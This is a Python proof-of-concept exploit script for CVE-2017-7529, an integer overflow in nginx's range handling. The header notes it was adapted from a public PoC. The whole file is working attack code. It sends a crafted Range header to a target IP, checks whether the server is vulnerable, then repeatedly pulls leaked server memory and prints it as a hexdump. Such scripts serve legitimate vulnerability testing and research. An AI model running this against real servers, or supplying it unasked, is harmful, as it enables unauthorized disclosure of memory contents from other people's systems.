"""
original code from https://github.com/en0f/CVE-2017-7529_PoC/

edited by Felix Nirsberger 2021
"""
import argparse
import time

import requests
import sys
import urllib.parse


class Exploit(requests.Session):
    buffer = set()

    def __init__(self, url):
        length = int(requests.get(url).headers.get("Content-Length", 0)) + 623
        super().__init__()
        self.headers = {"Range": f"bytes=-{length},-9223372036854{776000 - length}"}
        self.target = urllib.parse.urlsplit(url)

    def check(self):
        """
        checks if victim is vulnerable
        """
        try:
            response = self.get(self.target.geturl())
            return response.status_code == 206 and "Content-Range" in response.text
        except Exception as e:
            return False

    def hexdump(self, data):
        """
        prints extracted hex data from victim
        """
        for b in range(0, len(data), 16):
            line = [char for char in data[b: b + 16]]
            print(" -  {:04x}: {:48} {}".format(b, " ".join(f"{char:02x}" for char in line), "".join(
                (chr(char) if 32 <= char <= 126 else ".") for char in line)))

    def execute(self):
        """
        executes the integer overflow exploit on victim
        """
        vulnerable = self.check()
        print(f"[{'+' if vulnerable else '-'}] {exploit.target.netloc} is Vulnerable: {str(vulnerable).upper()}")
        if vulnerable:
            data = b""
            while len(self.buffer) < 0x80:
                try:
                    response = self.get(self.target.geturl())
                    for line in response.content.split(b"\r\n"):
                        if line not in self.buffer:
                            data += line
                            self.buffer.add(line)
                except Exception as e:
                    print()
                    print(f"[!] {type(e).__name__}:")
                    print(f" -  {e}")
                    break
                except KeyboardInterrupt:
                    print()
                    print("[!] Keyboard Interrupted! (Ctrl+C Pressed)")
                    break
                print(f"[i] Receiving Data [{len(data)} bytes] ...", end="\r")
            if data:
                print()
                self.hexdump(data)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2017-7529 integer overflow exploit")
    parser.add_argument('-ip', dest='server_ip', action='store', type=str, required=True,
                        help='The IP address of the target server')
    args = parser.parse_args()

    victim_url = "http://" + args.server_ip

    # main loop waiting for stdin line to execute exploit
    executed = False
    while True:
        if not executed:
            try:
                exploit = Exploit(victim_url)
                try:
                    exploit.execute()
                except Exception as e:
                    print(f"[!] {type(e).__name__}:")
                    print(f" -  {e}")
            except KeyboardInterrupt:
                print("[!] Keyboard Interrupted! (Ctrl+C Pressed)")
            except Exception as e:
                print(f"[!] {urllib.parse.urlsplit(victim_url).netloc}: {type(e).__name__}")
            executed = True
        else:
            time.sleep(5)
